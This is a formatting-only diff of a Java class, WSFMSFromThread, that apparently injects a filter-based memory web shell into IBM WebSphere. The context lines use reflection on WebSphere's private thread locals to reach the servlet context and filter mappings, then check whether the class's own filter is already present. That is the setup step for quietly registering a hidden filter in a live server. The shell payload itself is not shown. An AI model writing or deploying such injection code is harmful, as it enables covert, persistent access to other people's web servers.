@@ -19,7 +19,7 @@ public class WSFMSFromThread implements Filter {
 
     static {
         try {
-            Class                   clazz = Thread.currentThread().getClass();
+            Class clazz = Thread.currentThread().getClass();
             java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
             field.setAccessible(true);
             Object obj = field.get(Thread.currentThread());
@@ -30,7 +30,7 @@ public class WSFMSFromThread implements Filter {
                 if (o == null) continue;
 
                 if (o.getClass().getName().endsWith("WebContainerRequestState")) {
-                    Object request        = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
+                    Object request = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                     Object servletContext = request.getClass().getMethod("getServletContext", new Class[0]).invoke(request, new Object[0]);
 
                     field = servletContext.getClass().getDeclaredField("context");
@@ -41,7 +41,7 @@ public class WSFMSFromThread implements Filter {
                     field.setAccessible(true);
                     Object webAppConfiguration = field.get(context);
 
-                    Method   method  = null;
+                    Method method = null;
                     Method[] methods = webAppConfiguration.getClass().getMethods();
                     for (int i = 0; i < methods.length; i++) {
                         if (methods[i].getName().equals("getFilterMappings")) {
@@ -54,7 +54,7 @@ public class WSFMSFromThread implements Filter {
                     boolean flag = false;
                     for (int i = 0; i < filerMappings.size(); i++) {
                         Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
-                        String name         = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
+                        String name = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
                         if (name.equals(NAME)) {
                             flag = true;
                             break;
